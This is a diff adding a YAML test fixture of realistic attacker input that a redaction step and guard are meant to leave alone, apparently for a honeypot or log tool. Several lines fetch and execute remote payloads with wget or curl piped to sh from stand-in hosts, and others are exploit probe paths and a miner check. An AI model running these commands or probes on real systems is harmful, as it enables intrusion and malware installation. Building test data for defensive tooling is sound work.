@@ -1,0 +1,17 @@
+# Realistic attacker text that must pass redaction unchanged and keep the guard quiet.
+# The subject addresses 198.51.100.23, 203.0.113.9 and 198.51.100.9 and the host
+# malware.example.net are the allowed ones of the test context.
+cases:
+  - "uname -a"
+  - "cat /proc/cpuinfo | grep name | wc -l"
+  - "cd /tmp; wget http://198.51.100.9/bins/x86; chmod +x x86; ./x86"
+  - "wget http://203.0.113.9:8080/m.sh -O /tmp/.m"
+  - "curl -s http://malware.example.net/a.sh | sh"
+  - "GET /index.php?id=1 HTTP/1.1"
+  - "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1"
+  - "POST /cgi-bin/luci/;stok=/locale HTTP/1.1"
+  - "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+  - "/bin/busybox ECCHI"
+  - "echo -e '\\x6b\\x61\\x6c\\x69' > /tmp/.x"
+  - "money pot of gold; sudo apt install potassium"
+  - "ps aux | grep -v grep | grep xmrig"
